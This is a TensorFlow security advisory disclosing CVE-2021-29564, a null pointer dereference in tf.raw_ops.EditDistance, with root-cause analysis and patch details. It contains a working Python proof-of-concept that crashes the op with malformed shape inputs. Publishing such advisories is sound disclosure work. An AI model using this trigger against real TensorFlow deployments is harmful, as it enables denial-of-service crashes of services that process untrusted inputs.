## TFSA-2021-052: Null pointer dereference in `EditDistance`

### CVE Number
CVE-2021-29564

### Impact
An attacker can trigger a null pointer dereference in the implementation of
`tf.raw_ops.EditDistance`:

```python
import tensorflow as tf

hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)
hypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)
hypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)
truth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)
truth_values = tf.constant([], shape=[0], dtype=tf.float32)
truth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)

tf.raw_ops.EditDistance(
    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,
    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,
    truth_values=truth_values, truth_shape=truth_shape, normalize=True)
```

This is because the
[implementation](https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159)
has incomplete validation of the input parameters.

In the above scenario, an attacker causes an allocation of an empty tensor for
the output:

```cc
OP_REQUIRES_OK(ctx, ctx->allocate_output("output", output_shape, &output));
auto output_t = output->flat<float>();
output_t.setZero();
```

Because `output_shape` has 0 elements, the result of `output->flat<T>()` has an
empty buffer, so calling `setZero` would result in a null dereference.

### Patches
We have patched the issue in GitHub commit
[f4c364a5d6880557f6f5b6eb5cee2c407f0186b3](https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
